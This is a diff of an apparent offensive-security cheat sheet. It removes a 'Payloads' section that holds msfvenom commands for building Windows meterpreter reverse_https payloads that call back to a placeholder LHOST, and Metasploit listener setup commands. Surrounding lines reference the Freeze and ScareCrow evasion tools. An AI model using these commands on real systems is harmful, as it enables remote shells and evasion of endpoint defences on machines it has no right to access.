@@ -328,27 +328,6 @@ $ ./Freeze -I <FILE>.exe -encrypt -sandbox -process "C:\\Windows\\System32\\msed
 
 > https://github.com/Tylous/ScareCrow
 
-### Payloads
-
-#### Shellcode Payload Creation with msfvenom
-
-```c
-$ msfvenom -a x64 -p windows/x64/meterpreter/reverse_https LHOST=<LHOST> LPORT=8443 -f raw -o <FILE>.bin
-```
-
-#### .msi-File Payload Creation with msfvenom
-
-```c
-$ msfvenom -a x64 -p windows/x64/meterpreter/reverse_https LHOST=<LHOST> LPORT=8443 -f exe -o <FILE>.exe
-```
-
-#### Listener
-
-```c
-msf6 > use exploit/multi/handler
-msf6 > set payload windows/x64/meterpreter/reverse_https
-```
-
 ### Obfuscation
 
 #### Shellcode
